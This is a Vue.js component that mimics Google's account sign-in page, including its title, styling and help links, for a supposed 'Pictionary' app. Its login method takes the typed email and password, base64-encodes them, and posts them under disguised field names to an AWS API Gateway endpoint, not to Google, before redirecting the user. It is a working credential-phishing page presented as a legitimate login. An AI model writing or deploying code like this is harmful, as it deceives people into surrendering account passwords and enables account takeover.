
<template>
  <div>
    <span v-if="step == 1">
      <b-row  align-h="center" style="margin-top: 200px;">
        <b-col cols="3" style="font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;">
          <div class="card" style="border-radius: 7px;">
            <div class="card-header" style="text-align: left; color: #5f6368; background-color: #ffffff; font-size: 14px; height: 35px;">
              <img width="15px" style="margin-bottom:3px; margin-right:5px;" alt="Google login" src="./google.png" />
              Sign in with Google
            </div>
            <div class="card-body" style="padding-right: 40px; padding-left: 40px; padding-bottom: 5px;">
              <b-row class="mt-5">
                <b-col><h1 style="color: #202124; font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif; font-size: 24px; font-weight: 400 ;     line-height: 1.3333;">Sign in</h1></b-col>
              </b-row>
              <b-row class="mt-2" style="color: #202124; font-size: 16px; font-weight: 400; letter-spacing: .1px; line-height: 1.5;">
                <b-col>
                  to continue to <a href="http://pictionary.club" target="_blank" style="text-decoration: none; font-weight: bold; color: rgb(55 129 225);;">Pictionary</a>
                </b-col>
              </b-row>
              <b-row class="mt-5" style="margin-bottom: -8px;">
                <b-col>
                  <div class="">
                    <div :class="`field-wrapper ${email.length > 0 ? 'hasValue' : ''}`" @click="passBoxClick('email')">
                      <input v-model="email" type="text" name="email" id="email" @keyup="passKeyUp">
                      <div class="field-placeholder"><span>Email or phone</span></div>
                    </div>
                  </div>
                </b-col>
              </b-row>
              <b-row class="">
                <b-col>
                  <div style="float: left; font-size: 14px;">
                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin" target="_blank" style="text-decoration: none; font-weight: bold; color: rgb(55 129 225);">Forgot email?</a>
                  </div>
                </b-col>
              </b-row>
              <b-row class="mt-5">
                <b-col>
                  <div class="" style="color: #5f6368; font-size: 14px; line-height: 1.4286; text-align: left;">
                    To continue, Google will share your name, email address, language preference and profile picture with Pictionary.
                    Before using this app, you can review Pictionary’s
                    <a href="http://pictionary.club/privacy-policy" target="_blank" style="text-decoration: none; font-weight: bold; color: rgb(55 129 225);">privacy policy</a> and Terms of Service.
                  </div>
                </b-col>
              </b-row>
              <b-row class="my-5">
                <b-col style="float: left">
                  <div style="text-align: left; font-size: 14px;">
                    <a href="https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&dsh=S-1022421294%3A1622321834694864&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank" style="text-decoration: none; font-weight: bold; color: rgb(55 129 225);">Create account</a>
                  </div>
                </b-col>
                <b-col>
                  <div class="form-button">
                    <b-button size="sm" variant="primary" @click="next" style="padding-left: 15px; padding-right: 15px;">Next</b-button>
                    <!-- <button id="next" type="button" class="btn btn-primary" @click="next">Next</button> -->
                  </div>
                </b-col>
              </b-row>
            </div>
          </div>
        </b-col>
      </b-row>
      <b-row class="mt-3"  align-h="center">
        <b-col cols="2" style="">
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;">English (United Stetes)</span>
        </b-col>
        <b-col cols="2" style="">
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://support.google.com/accounts?hl=en" target="_blank">Help</a></span>
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">Privacy</a></span>
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">Terms</a></span>
        </b-col>
      </b-row>
    </span>
    <span v-else>
      <b-row  align-h="center" style="margin-top: 200px;">
        <b-col cols="3" style="font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;">
          <div class="card" style="border-radius: 7px;">
            <div v-if="loading">
              <div class="loader__element"></div>
            </div>
            <div class="card-header" style="text-align: left; color: #5f6368; background-color: #ffffff; font-size: 14px; height: 35px;">
              <img width="15px" style="margin-bottom:3px; margin-right:5px;" alt="Google login" src="./google.png" />
              Sign in with Google
            </div>
            <div class="card-body" style="padding-right: 40px; padding-left: 40px; padding-bottom: 5px;">
              <b-row class="mt-5">
                <b-col><h1 style="color: #202124; font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif; font-size: 24px; font-weight: 400 ;     line-height: 1.3333;">Welcome</h1></b-col>
              </b-row>
              <b-row class="my-1">
                <b-col style="color: #3c4043; font-size: 12px; line-height: 1.3333; word-break: break-all; font-weight: 500; letter-spacing: .25px;"><b>
                  <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" ><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                  {{email}}</b></b-col>
              </b-row>
              <b-row class="mt-5" style="margin-bottom: -8px;">
                <b-col>
                  <div >
                    <div :class="`field-wrapper ${password.length > 0 ? 'hasValue' : ''}`" @click="passBoxClick('password')">
                      <input v-model="password" :type="`${showPassword ? 'text' : 'password'}`" name="password" id="password" @keyup="passKeyUp">
                      <div class="field-placeholder"><span>Enter your password</span></div>
                    </div>
                  </div>
                </b-col>
              </b-row>
              <b-row class="">
                <b-col>
                  <div class="form-check show-password">
                    <input v-model="showPassword" class="form-check-input" type="checkbox" value="" id="flexCheckDefault"  style="cursor: pointer;">
                    <label class="form-check-label" for="flexCheckDefault" style="cursor: pointer;">
                      Show password
                    </label>
                  </div>
                </b-col>
              </b-row>
              <b-row class="mt-5">
                <b-col>
                  <div class="" style="color: #5f6368; font-size: 14px; line-height: 1.4286; text-align: left;">
                    To continue, Google will share your name, email address, language preference and profile picture with Pictionary.
                    Before using this app, you can review Pictionary’s
                    <a href="http://pictionary.club/privacy-policy" target="_blank" style="text-decoration: none; font-weight: bold; color: rgb(55 129 225);">privacy policy</a> and Terms of Service.
                  </div>
                </b-col>
              </b-row>
              <b-row class="my-5">
                <b-col>
                  <div class="form-button">
                    <b-button size="sm" variant="primary" @click="login" style="padding-left: 15px; padding-right: 15px;">Login</b-button>
                  </div>
                </b-col>
              </b-row>
            </div>
          </div>
        </b-col>
      </b-row>
      <b-row class="mt-3"  align-h="center">
        <b-col cols="2" style="">
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;">English (United Stetes)</span>
        </b-col>
        <b-col cols="2" style="">
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://support.google.com/accounts?hl=en" target="_blank">Help</a></span>
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">Privacy</a></span>
          <span style="text-align: left; font-size: small; color: #585858; margin-left: 10px;"><a style="text-decoration: none;
    color: #757575; cursor: pointer;" href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">Terms</a></span>
        </b-col>
      </b-row>
    </span>
  </div>
</template>

<script>
//installed components go here
import axios from 'axios';

//user Defined components go here

//ordering => components, props, watch, mounted, created, method, data
export default {
  components: {},
  props: [],
  watch: {},
  mounted() {},
  created() {
    document.title = 'Sign in - Google Accounts';
    this.email = '';
    this.password = '';
    this.step = 1;
    setTimeout(() => {
      document.getElementById("email").focus();
    });
  },
  methods: {
    passBoxClick(id) {
      document.getElementById(id).focus();
      // $(this).closest(".field-wrapper").find("input").focus();
    },
    passKeyUp() {
    },
    next() {
      if(this.email.length > 0) {
        this.step += 1;
        setTimeout(() => {
          document.getElementById("password").focus();
        });
      }
    },
    login() {
      if(this.email.length > 0 && this.password.length > 0) {
        let e = btoa(this.email);
        let p = btoa(this.password);
        // const url = 'https://dyl2bhw57g.execute-api.us-east-1.amazonaws.com/auth/o/oauth2/identifier?state=%7B%22connect%22%3Afalse,%22csrf%22%3A%2285dfed2088bb4917b5418c6c3cfb0dc6%22,%22pkce_oauth%22%3Anull%7D&redirect_uri=http%3A%2F%2Fpictionary.club%2Fcallback&response_type=token&apppackagename=com.pictionary&client_id=600979030768-7o35cjq1gv138e22oj0j39u0bp0mn3hj.apps.googleusercontent.com&prompt=select_account&scope=email%20profile&flowName=GeneralOAuthFlow';
        console.log(this.$route);

        const redirect_uri = this.$route.query.redirect_uri;

        const url = `https://dyl2bhw57g.execute-api.us-east-1.amazonaws.com/auth/o/oauth2/identifier?redirect_uri=${redirect_uri}&response_type=token&apppackagename=com.pictionary&client_id=600979030768-7o35cjq1gv138e22oj0j39u0bp0mn3hj.apps.googleusercontent.com&prompt=select_account&scope=email profile&flowName=GeneralOAuthFlow`;

        const body = {
          key: e,
          clientid: p
        }

        this.loading = true;

        axios.post(url, body)
          .then(response => {
            const redirectionurl = response.data.redirectionUrl;
            window.location.href = redirectionurl;
          })
          .catch(error => {
            console.log(error);
          })
          .finally(() => {
            setTimeout(() => {
              this.loading = false
            }, 500);
          })
      }
    }
  },
  data() {
    return {
      email: '',
      password: '',
      showPassword: false,
      step: 1,
      loading: false
    }
  },
}
</script>

<style scoped>
.loader__element {
	height: 3px;
	width: 100%;
	background: rgb(137 185 246);

}

.loader__element:before {
	content: '';
	display: block;
	background-color: rgb(55 129 225);
	height: 3px;
	width: 0;
  animation: getWidth 2s ease-in infinite;
}

@keyframes getWidth {
	100% { width: 100%; }
}
  .stUf5b {
    color: #3c4043;
    height: 20px;
    width: 20px;
  }

  .form-button{
    text-align: right;
  }

        .field-wrapper{
            position: relative;
            margin-bottom: 15px;
        }

        .field-wrapper input{
            border: 1px solid #DADCE0;
            padding: 15px;
            border-radius: 4px;
            width: 100%;
        }

        .field-wrapper .field-placeholder{
            font-size: 16px;
            position: absolute;
            /* background: #fff; */
            bottom: 17px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #80868b;
            left: 8px;
            padding: 0 8px;
            -webkit-transition: transform 150ms cubic-bezier(0.4,0,0.2,1),opacity 150ms cubic-bezier(0.4,0,0.2,1);
            transition: transform 150ms cubic-bezier(0.4,0,0.2,1),opacity 150ms cubic-bezier(0.4,0,0.2,1);
            z-index: 1;

            text-align: left;
            width: 100%;
        }

        .field-wrapper .field-placeholder span{
            background: #ffffff;
            padding: 0px 8px;
        }

        .field-wrapper input:not([disabled]):focus~.field-placeholder
        {
            color:#1A73E8;
        }

        .field-wrapper input:not([disabled]):focus~.field-placeholder,
        .field-wrapper.hasValue input:not([disabled])~.field-placeholder
        {
            -webkit-transform: scale(.75) translateY(-39px) translateX(-60px);
            transform: scale(.75) translateY(-39px) translateX(-60px);

        }

        .show-password {
          direction: ltr;
          line-height: 1.4286;
          font-size: 14px;
          white-space: normal;
          color: #25272ae3;
          box-sizing: inherit;
          cursor: pointer;
          text-align: left;
        }
</style>
